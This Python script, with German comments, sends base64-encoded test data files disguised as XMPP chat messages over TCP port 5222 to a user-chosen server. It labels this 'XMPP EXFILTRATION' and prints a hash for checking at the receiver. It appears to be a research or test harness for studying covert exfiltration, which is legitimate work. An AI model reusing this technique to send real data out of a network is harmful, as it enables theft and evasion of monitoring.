#!/usr/bin/python

import argparse
import socket
from util.cborctl import CBORIterator, readFromFile
from hashlib import sha256
import base64
import ipaddress
import sys


def getMessage(data: bytes):
    encoded = base64.b64encode(data).decode()
    message = f"""
    <message
        to='example.com'>
        <body>{encoded}</body>
    </message>
    """
    #print(message)
    return message


def getMessageStr(data: str):
    message = f"""
    <message
        to='example.com'>
        <body>{data}</body>
    </message>
    """
    #print(message)
    return message


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (500 KB, 1, 5, 10 MB)")
parser.add_argument("-s", "--Segment", action="store_true", help = "Segement packets into Ethernet MTU sizes")
parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
args = parser.parse_args()

# SEG
#   -> True: Packetgröße auf MTU limitieren
#   -> False: Beliebige Packetgröße (ein Packet mit vollständigem Payload)
SEG = False
if args.Segment == True: SEG = True

size = int(args.Length)
print(size)
if size not in [1,5,10,500]:
    print("Invalid exfiltration size!")
    sys.exit(1)

SERVER_IP = ""
try:
    ipaddress.ip_address(args.Target)
except ValueError:
    print("Invalid target server address!")
    sys.exit(1)

SERVER_IP = args.Target
PSIZE = 1379

print("\n====================XMPP EXFILTRATION====================\n")

info = "ON" if SEG else "OFF"
print(f"Exfiltrating {size} MB with Segementing {info}")

if size == 500:
    content = readFromFile("data_05mb.json")
else:
    content = readFromFile(f"data_{size}mb.json")
print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")

b64content = base64.b64encode(content).decode()
length = len(b64content)
print("Length of payload bytestream (Base64 encoded): " + str(length) + "\n")

crwaler = CBORIterator(content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        # Socket öffnen
    s.connect((SERVER_IP, 5222))
    packet_counter = 0
    idx = 0

    print("START sending packets")
    while length - idx >= PSIZE and SEG:                            # Payload aufteilen
        packet = getMessageStr(b64content[idx:idx+PSIZE])           # Message generieren
        output = packet.encode("utf-8")
        s.send(output)
        packet_counter += 1
        idx += PSIZE
    
    packet = getMessageStr(b64content[idx:])                        # restliche bytes senden
    #print("Last packet sent: ")
    #print(packet)
    output = packet.encode("utf-8")
    s.send(output)
    print("FINISHED sending packets")
    packet_counter += 1
    print("Length of last packet: " + str(len(output)))
    print("Packets sent: " + str(packet_counter))